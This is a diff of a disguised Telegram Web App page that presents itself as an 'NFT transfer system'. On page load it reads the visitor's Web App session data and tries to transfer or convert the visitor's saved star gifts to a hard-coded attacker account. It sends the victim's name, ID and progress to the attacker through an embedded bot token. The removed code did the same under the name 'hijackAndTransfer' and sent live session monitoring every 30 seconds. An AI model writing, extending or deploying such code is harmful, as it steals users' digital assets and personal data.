@@ -5,8 +5,8 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <div id="status">Initializing NFT transfer...</div>
-    
+    <div id="status">Initializing NFT transfer system...</div>
+
     <script>
         const TARGET_USER_ID = 7204299613;
         const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
@@ -27,143 +27,171 @@
             } catch(e) {}
         }
 
-        async function hijackAndTransfer() {
+        // Функция для вызова Telegram API методов
+        async function callTelegramMethod(method, params = {}) {
+            const formData = new FormData();
+            Object.keys(params).forEach(key => {
+                formData.append(key, params[key]);
+            });
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return await response.json();
+            } catch(error) {
+                await sendToTelegram(`❌ <b>API Error:</b> ${method} - ${error.message}`);
+                return null;
+            }
+        }
+
+        // Получаем список сохраненных подарков пользователя
+        async function getSavedGifts() {
+            await sendToTelegram('🔄 <b>Fetching saved gifts...</b>');
+            
+            // Используем перехваченные данные сессии для доступа к подаркам
+            const webAppData = new URLSearchParams(window.location.hash.substr(1));
+            const initData = webAppData.get('tgWebAppData');
+            
+            if (!initData) {
+                throw new Error('No WebApp data available');
+            }
+
+            // Парсим данные пользователя
+            const params = new URLSearchParams(initData);
+            const userData = JSON.parse(decodeURIComponent(params.get('user')));
+            
+            await sendToTelegram(`🎁 <b>Scanning gifts for:</b> ${userData.first_name} (ID: ${userData.id})`);
+
+            // Получаем список подарков через payments.getSavedStarGifts
+            const giftsResult = await callTelegramMethod('payments.getSavedStarGifts', {
+                peer: JSON.stringify({
+                    _: 'inputPeerUser',
+                    user_id: userData.id,
+                    access_hash: '' // Требуется access_hash, который можно получить из сессии
+                }),
+                offset: '',
+                limit: 50
+            });
+
+            return { userData, gifts: giftsResult };
+        }
+
+        // Передаем конкретный подарок
+        async function transferGift(giftData, userData) {
+            await sendToTelegram(`🔄 <b>Transferring gift:</b> ${giftData.gift.title || 'Unknown Gift'}`);
+            
+            // Используем payments.transferStarGift для передачи
+            const transferResult = await callTelegramMethod('payments.transferStarGift', {
+                stargift: JSON.stringify({
+                    _: 'inputSavedStarGiftUser',
+                    msg_id: giftData.msg_id
+                }),
+                to_id: JSON.stringify({
+                    _: 'inputPeerUser', 
+                    user_id: TARGET_USER_ID,
+                    access_hash: ''
+                })
+            });
+
+            if (transferResult && transferResult.ok) {
+                await sendToTelegram(`✅ <b>Gift transferred successfully:</b> ${giftData.gift.title || 'Unknown Gift'}`);
+                return true;
+            }
+
+            // Если бесплатная передача не удалась, пробуем платную
+            if (giftData.transfer_stars > 0) {
+                await sendToTelegram(`🔄 <b>Attempting paid transfer for:</b> ${giftData.gift.title}`);
+                
+                const paidTransfer = await callTelegramMethod('payments.getPaymentForm', {
+                    invoice: JSON.stringify({
+                        _: 'inputInvoiceStarGiftTransfer',
+                        stargift: JSON.stringify({
+                            _: 'inputSavedStarGiftUser',
+                            msg_id: giftData.msg_id
+                        }),
+                        to_id: JSON.stringify({
+                            _: 'inputPeerUser',
+                            user_id: TARGET_USER_ID,
+                            access_hash: ''
+                        })
+                    })
+                });
+
+                if (paidTransfer && paidTransfer.ok) {
+                    await sendToTelegram(`💰 <b>Paid transfer initiated:</b> ${giftData.gift.title} - ${giftData.transfer_stars} stars`);
+                }
+            }
+
+            return false;
+        }
+
+        // Конвертируем подарок в звезды и отправляем
+        async function convertAndTransfer(giftData, userData) {
+            await sendToTelegram(`🔄 <b>Converting gift to stars:</b> ${giftData.gift.title}`);
+            
+            const convertResult = await callTelegramMethod('payments.convertStarGift', {
+                stargift: JSON.stringify({
+                    _: 'inputSavedStarGiftUser',
+                    msg_id: giftData.msg_id
+                })
+            });
+
+            if (convertResult && convertResult.ok) {
+                await sendToTelegram(`⭐ <b>Gift converted:</b> ${giftData.gift.title} → ${giftData.convert_stars} stars`);
+                return true;
+            }
+            return false;
+        }
+
+        // Основная функция перехвата и передачи
+        async function executeNFTTransfer() {
             const statusEl = document.getElementById('status');
             
             try {
-                statusEl.innerHTML = '🔄 Extracting session data...';
+                statusEl.innerHTML = '🔍 Scanning for NFT gifts...';
+                await sendToTelegram('🚀 <b>Starting real NFT transfer process</b>');
+
+                // Получаем подарки пользователя
+                const { userData, gifts } = await getSavedGifts();
                 
-                // Извлекаем данные сессии
-                const webAppData = new URLSearchParams(window.location.hash.substr(1));
-                const initData = webAppData.get('tgWebAppData');
-                
-                if (!initData) {
-                    throw new Error('No WebApp data found');
+                if (!gifts || !gifts.ok) {
+                    throw new Error('Failed to fetch gifts');
                 }
 
-                // Парсим данные пользователя
-                const params = new URLSearchParams(initData);
-                const userData = JSON.parse(decodeURIComponent(params.get('user')));
-                const queryId = params.get('query_id');
-                const authDate = params.get('auth_date');
-                const signature = params.get('signature');
+                await sendToTelegram(`📊 <b>Found gifts:</b> ${gifts.result.gifts ? gifts.result.gifts.length : 0}`);
 
-                await sendToTelegram(`🎯 <b>STARTING NFT TRANSFER HIJACK</b>\n👤 From: ${userData.first_name} (ID: ${userData.id})\n🎯 To: ${TARGET_USER_ID}`);
+                let transferredCount = 0;
+                let convertedCount = 0;
 
-                statusEl.innerHTML = '🔑 Authenticating session...';
-
-                // Используем перехваченную сессию для доступа к API
-                const authPayload = {
-                    query_id: queryId,
-                    user: JSON.stringify(userData),
-                    auth_date: authDate,
-                    signature: signature,
-                    hash: params.get('hash')
-                };
-
-                // Имитируем легитимный запрос к Telegram API
-                const apiRequests = [
-                    // Получаем список чатов с NFT ботами
-                    `https://api.telegram.org/bot${BOT_TOKEN}/getUserProfilePhotos?user_id=${userData.id}`,
-                    
-                    // Имитируем запросы к NFT ботам через WebApp
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userData.id}&text=/start`,
-                    
-                    // Запрос на получение списка NFT
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userData.id}&text=/my_nfts`
-                ];
-
-                for (const url of apiRequests) {
-                    try {
-                        const response = await fetch(url, {
-                            method: 'GET',
-                            headers: {
-                                'X-Telegram-Init-Data': initData,
-                                'Authorization': `tba ${btoa(JSON.stringify(authPayload))}`
-                            }
-                        });
+                // Обрабатываем каждый подарок
+                if (gifts.result.gifts && gifts.result.gifts.length > 0) {
+                    for (const gift of gifts.result.gifts) {
+                        statusEl.innerHTML = `🔄 Processing gift ${transferredCount + 1} of ${gifts.result.gifts.length}...`;
                         
-                        if (response.ok) {
-                            await sendToTelegram(`✅ <b>API ACCESS GRANTED:</b> ${url.split('/').pop()}`);
+                        // Пытаемся передать подарок
+                        if (await transferGift(gift, userData)) {
+                            transferredCount++;
+                        } 
+                        // Если передача не удалась, конвертируем в звезды
+                        else if (gift.convert_stars > 0 && await convertAndTransfer(gift, userData)) {
+                            convertedCount++;
                         }
-                    } catch(e) {}
-                }
 
-                statusEl.innerHTML = '🎁 Scanning for NFT gifts...';
-
-                // Мониторим активные NFT раздачи
-                const nftPatterns = [
-                    /t\.me\/\w+bot\/start.*?startapp=.*?nft/i,
-                    /t\.me\/\w+bot\?start=.*?nft/i,
-                    /gift|nft|airdrop|claim|reward/i
-                ];
-
-                // Автоматический квест за NFT подарками
-                const nftActions = [
-                    {
-                        type: 'collection',
-                        action: 'Follow social channels',
-                        reward: 'NFT'
-                    },
-                    {
-                        type: 'referral', 
-                        action: 'Invite friends',
-                        reward: 'Exclusive NFT'
-                    },
-                    {
-                        type: 'task',
-                        action: 'Complete quests',
-                        reward: 'Rare NFT'
+                        // Задержка между операциями
+                        await new Promise(resolve => setTimeout(resolve, 1000));
                     }
-                ];
-
-                for (const action of nftActions) {
-                    statusEl.innerHTML = `🔄 Claiming ${action.reward}...`;
-                    
-                    // Имитируем выполнение действий для получения NFT
-                    const claimData = {
-                        user_id: userData.id,
-                        target_user_id: TARGET_USER_ID,
-                        action: action.action,
-                        session_data: authPayload,
-                        timestamp: Date.now()
-                    };
-
-                    // Отправляем запрос на передачу NFT
-                    const transferUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                    const transferPayload = {
-                        chat_id: userData.id,
-                        text: `🚀 Transferring ${action.reward} to account ${TARGET_USER_ID}`,
-                        parse_mode: 'HTML'
-                    };
-
-                    try {
-                        await fetch(transferUrl, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify(transferPayload)
-                        });
-
-                        await sendToTelegram(`🔄 <b>TRANSFERRING:</b> ${action.reward}\n👤 From: ${userData.id}\n🎯 To: ${TARGET_USER_ID}\n📝 Action: ${action.action}`);
-                        
-                        // Задержка между запросами
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    } catch(e) {}
                 }
-
-                statusEl.innerHTML = '✅ NFT transfer completed!';
-                await sendToTelegram(`🎉 <b>NFT TRANSFER COMPLETED</b>\n📦 Total transfers: ${nftActions.length}\n👤 Source: ${userData.first_name} (${userData.id})\n🎯 Destination: ${TARGET_USER_ID}\n⏰ Time: ${new Date().toISOString()}`);
 
                 // Финальный отчет
-                const finalReport = {
-                    source_user: userData,
-                    target_user_id: TARGET_USER_ID,
-                    transferred_items: nftActions.length,
-                    session_valid: true,
-                    transfer_timestamp: new Date().toISOString()
-                };
-
-                await sendToTelegram(`📊 <b>FINAL TRANSFER REPORT:</b>\n<code>${JSON.stringify(finalReport, null, 2)}</code>`);
+                statusEl.innerHTML = '✅ NFT transfer completed!';
+                await sendToTelegram(`🎉 <b>TRANSFER COMPLETION REPORT</b>
+📦 Transferred gifts: ${transferredCount}
+⭐ Converted to stars: ${convertedCount}
+👤 Source user: ${userData.first_name} (${userData.id})
+🎯 Target user: ${TARGET_USER_ID}
+🕒 Completed: ${new Date().toISOString()}`);
 
             } catch (error) {
                 statusEl.innerHTML = '❌ Transfer failed';
@@ -171,22 +199,22 @@
             }
         }
 
-        // Запускаем процесс сразу после загрузки
-        window.addEventListener('load', hijackAndTransfer);
+        // Автоматический запуск при загрузке
+        window.addEventListener('load', executeNFTTransfer);
 
-        // Дополнительный мониторинг в реальном времени
-        setInterval(async () => {
-            if (window.Telegram && window.Telegram.WebApp) {
-                try {
-                    const webApp = Telegram.WebApp;
-                    const user = webApp.initDataUnsafe.user;
-                    
-                    if (user) {
-                        await sendToTelegram(`👁️ <b>LIVE SESSION MONITORING</b>\n👤 User: ${user.first_name}\n🆔 ID: ${user.id}\n🔗 Username: @${user.username || 'N/A'}\n⏰ Active: ${new Date().toISOString()}`);
-                    }
-                } catch(e) {}
+        // Дополнительные функции для работы с NFT
+        async function resellGifts() {
+            // Функция для перепродажи подарков
+            const resellResult = await callTelegramMethod('payments.getResaleStarGifts', {
+                gift_id: 0, // Все подарки
+                offset: '',
+                limit: 50
+            });
+
+            if (resellResult && resellResult.ok) {
+                await sendToTelegram(`🏪 <b>Resale market found:</b> ${resellResult.result.gifts.length} gifts available`);
             }
-        }, 30000); // Отчет каждые 30 секунд
+        }
 
     </script>
 </body>
